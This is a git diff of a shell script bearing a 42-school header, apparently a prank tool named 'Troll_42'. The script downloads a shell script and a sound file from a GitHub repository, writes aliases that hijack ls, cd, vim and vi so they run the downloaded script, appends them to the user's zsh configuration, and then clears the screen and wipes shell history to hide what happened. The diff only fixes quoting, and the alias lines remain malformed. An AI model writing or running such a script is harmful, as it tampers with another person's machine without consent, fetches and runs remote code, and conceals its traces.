@@ -6,7 +6,7 @@
 #    By: amonteli <marvin@le-101.fr>                +:+   +:    +:    +:+      #
 #                                                  #+#   #+    #+    #+#       #
 #    Created: 2019/07/20 21:38:02 by amonteli     #+#   ##    ##    #+#        #
-#    Updated: 2019/07/23 11:54:34 by amonteli    ###    #+. /#+    ###.fr      #
+#    Updated: 2019/07/23 18:30:49 by amonteli    ###    #+. /#+    ###.fr      #
 #                                                          /                   #
 #                                                         /                    #
 # **************************************************************************** #
@@ -34,15 +34,15 @@ curl https://raw.githubusercontent.com/iSnkh/Troll_42/master/lsound/zsht.sh -o ~
 curl https://raw.githubusercontent.com/iSnkh/Troll_42/master/sound/nik-zebi-vegeta.mp3 -o ~/.troll.mp3
 touch ~/.oh-my-zsh/custom/alias.zsh
 
-echo "alias ls=('sh ~./zsht.sh" >> ~/.oh-my-zsh/custom/alias.zsh
-echo "alias cd=('sh ~./zsht.sh" >> ~/.oh-my-zsh/custom/alias.zsh
-echo "alias vim=('sh ~./zsht.sh" >> ~/.oh-my-zsh/custom/alias.zsh
-echo "alias vi=('sh ~./zsht.sh" >> ~/.oh-my-zsh/custom/alias.zsh
+echo "alias ls=('sh ~./zsht.sh'" >> ~/.oh-my-zsh/custom/alias.zsh
+echo "alias cd=('sh ~./zsht.sh'" >> ~/.oh-my-zsh/custom/alias.zsh
+echo "alias vim=('sh ~./zsht.sh'" >> ~/.oh-my-zsh/custom/alias.zsh
+echo "alias vi=('sh ~./zsht.sh'" >> ~/.oh-my-zsh/custom/alias.zsh
 
-echo "alias ls=('sh ~./zsht.sh" >> ~/.zshrc
-echo "alias cd=('sh ~./zsht.sh" >> ~/.zshrc
-echo "alias vim=('sh ~./zsht.sh" >> ~/.zshrc
-echo "alias vi=('sh ~./zsht.sh" >> ~/.zshrc
+echo "alias ls=('sh ~./zsht.sh'" >> ~/.zshrc
+echo "alias cd=('sh ~./zsht.sh'" >> ~/.zshrc
+echo "alias vim=('sh ~./zsht.sh'" >> ~/.zshrc
+echo "alias vi=('sh ~./zsht.sh'" >> ~/.zshrc
 
 clear
 history -c 
